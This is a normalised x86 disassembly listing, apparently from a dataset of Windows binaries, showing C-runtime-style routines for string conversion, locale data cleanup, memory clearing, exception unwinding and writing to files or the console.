call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_40aa97
mov [ eax ] 0x2a
call sub_40aa97
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_40aa97
push 0x22
pop esi
mov [ eax ] esi
call sub_40bf44
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_40f160
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_40f160
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40fd0b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40b678
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40fd56
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40b678
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_40fdc1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_409fcc
push [ esi + 0x8 ]
call sub_409fcc
push [ esi + 0xc ]
call sub_409fcc
push [ esi + 0x10 ]
call sub_409fcc
push [ esi + 0x14 ]
call sub_409fcc
push [ esi + 0x18 ]
call sub_409fcc
push [ esi ]
call sub_409fcc
push [ esi + 0x20 ]
call sub_409fcc
push [ esi + 0x24 ]
call sub_409fcc
push [ esi + 0x28 ]
call sub_409fcc
push [ esi + 0x2c ]
call sub_409fcc
push [ esi + 0x30 ]
call sub_409fcc
push [ esi + 0x34 ]
call sub_409fcc
push [ esi + 0x1c ]
call sub_409fcc
push [ esi + 0x38 ]
call sub_409fcc
push [ esi + 0x3c ]
call sub_409fcc
add esp 0x40
push [ esi + 0x40 ]
call sub_409fcc
push [ esi + 0x44 ]
call sub_409fcc
push [ esi + 0x48 ]
call sub_409fcc
push [ esi + 0x4c ]
call sub_409fcc
push [ esi + 0x50 ]
call sub_409fcc
push [ esi + 0x54 ]
call sub_409fcc
push [ esi + 0x58 ]
call sub_409fcc
push [ esi + 0x5c ]
call sub_409fcc
push [ esi + 0x60 ]
call sub_409fcc
push [ esi + 0x64 ]
call sub_409fcc
push [ esi + 0x68 ]
call sub_409fcc
push [ esi + 0x6c ]
call sub_409fcc
push [ esi + 0x70 ]
call sub_409fcc
push [ esi + 0x74 ]
call sub_409fcc
push [ esi + 0x78 ]
call sub_409fcc
push [ esi + 0x7c ]
call sub_409fcc
add esp 0x40
push [ esi + 0x80 ]
call sub_409fcc
push [ esi + 0x84 ]
call sub_409fcc
push [ esi + 0x88 ]
call sub_409fcc
push [ esi + 0x8c ]
call sub_409fcc
push [ esi + 0x90 ]
call sub_409fcc
push [ esi + 0x94 ]
call sub_409fcc
push [ esi + 0x98 ]
call sub_409fcc
push [ esi + 0x9c ]
call sub_409fcc
push [ esi + 0xa0 ]
call sub_409fcc
push [ esi + 0xa4 ]
call sub_409fcc
push [ esi + 0xa8 ]
call sub_409fcc
push [ esi + 0xbc ]
call sub_409fcc
push [ esi + 0xc0 ]
call sub_409fcc
push [ esi + 0xc4 ]
call sub_409fcc
push [ esi + 0xc8 ]
call sub_409fcc
push [ esi + 0xcc ]
call sub_409fcc
add esp 0x40
push [ esi + 0xd0 ]
call sub_409fcc
push [ esi + 0xb8 ]
call sub_409fcc
push [ esi + 0xd8 ]
call sub_409fcc
push [ esi + 0xdc ]
call sub_409fcc
push [ esi + 0xe0 ]
call sub_409fcc
push [ esi + 0xe4 ]
call sub_409fcc
push [ esi + 0xe8 ]
call sub_409fcc
push [ esi + 0xec ]
call sub_409fcc
push [ esi + 0xd4 ]
call sub_409fcc
push [ esi + 0xf0 ]
call sub_409fcc
push [ esi + 0xf4 ]
call sub_409fcc
push [ esi + 0xf8 ]
call sub_409fcc
push [ esi + 0xfc ]
call sub_409fcc
push [ esi + 0x100 ]
call sub_409fcc
push [ esi + 0x104 ]
call sub_409fcc
push [ esi + 0x108 ]
call sub_409fcc
add esp 0x40
push [ esi + 0x10c ]
call sub_409fcc
push [ esi + 0x110 ]
call sub_409fcc
push [ esi + 0x114 ]
call sub_409fcc
push [ esi + 0x118 ]
call sub_409fcc
push [ esi + 0x11c ]
call sub_409fcc
push [ esi + 0x120 ]
call sub_409fcc
push [ esi + 0x124 ]
call sub_409fcc
push [ esi + 0x128 ]
call sub_409fcc
push [ esi + 0x12c ]
call sub_409fcc
push [ esi + 0x130 ]
call sub_409fcc
push [ esi + 0x134 ]
call sub_409fcc
push [ esi + 0x138 ]
call sub_409fcc
push [ esi + 0x13c ]
call sub_409fcc
push [ esi + 0x140 ]
call sub_409fcc
push [ esi + 0x144 ]
call sub_409fcc
push [ esi + 0x148 ]
call sub_409fcc
add esp 0x40
push [ esi + 0x14c ]
call sub_409fcc
push [ esi + 0x150 ]
call sub_409fcc
push [ esi + 0x154 ]
call sub_409fcc
push [ esi + 0x158 ]
call sub_409fcc
push [ esi + 0x15c ]
call sub_409fcc
push [ esi + 0x160 ]
call sub_409fcc
add esp 0x18
sub_410138
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_409fcc
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_409fcc
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_409fcc
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_409fcc
pop ecx
push esi
call sub_409fcc
pop ecx
sub_4101a1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_409fcc
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_409fcc
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_409fcc
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_409fcc
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_409fcc
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_409fcc
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_409fcc
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_409fcc
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_409fcc
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_409fcc
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_409fcc
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_409fcc
pop ecx
push esi
call sub_409fcc
pop ecx
sub_41029f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_409fbd
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_40f131
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_40a9c1
pop ecx
cmp eax ebx
je r-xdata
call sub_410690
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_40f131
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_40a9c1
pop ecx
cmp eax ebx
je r-xdata
call sub_410690
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_410486
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40b678
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_41029f
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4104cc
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_409fbd
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_40f160
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_40f131
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_40a9c1
pop ecx
cmp eax ebx
je r-xdata
call sub_410690
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_4105b3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40b678
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_4104cc
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_410600
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_410650
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_4106bc
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_410780
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4107a0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_409fbd
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_4107e5
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_4107e5
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_4107a0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_410895
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_4108b4
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_41088c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_410895
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_4108b7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_40aa97
mov [ eax ] 0x16
call sub_40bf44
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_40f826
push esi
mov edi eax
call sub_41158b
push esi
call sub_40fa0f
push eax
call sub_4114c7
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_409fcc
and [ esi + 0x1c ] 0x0
pop ecx
sub_410924
push 0xc
push r--data
call sub_40c290
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_40aa97
mov [ eax ] 0x16
call sub_40bf44
or eax 0xffffffff
jmp r-xdata
push esi
call sub_40cb8e
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_4108b7
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410990
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_40c2d5
retn
mov eax [ ebp - 0x1c ]
sub_410998
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_411400
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_40aaaa
mov [ eax ] edi
call sub_40aa97
mov [ eax ] 0x16
call sub_40bf44
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_409fbd
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_40aaaa
and [ eax ] 0x0
call sub_40aa97
mov [ eax ] 0x16
call sub_40bf44
jmp r-xdata
push esi
call sub_40f9b9
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_411242
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_40b2d2
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_40aa97
mov [ eax ] 0x1c
call sub_40aaaa
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_40aabd
pop ecx
jmp r-xdata
call sub_40aa97
mov [ eax ] 0x9
call sub_40aaaa
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
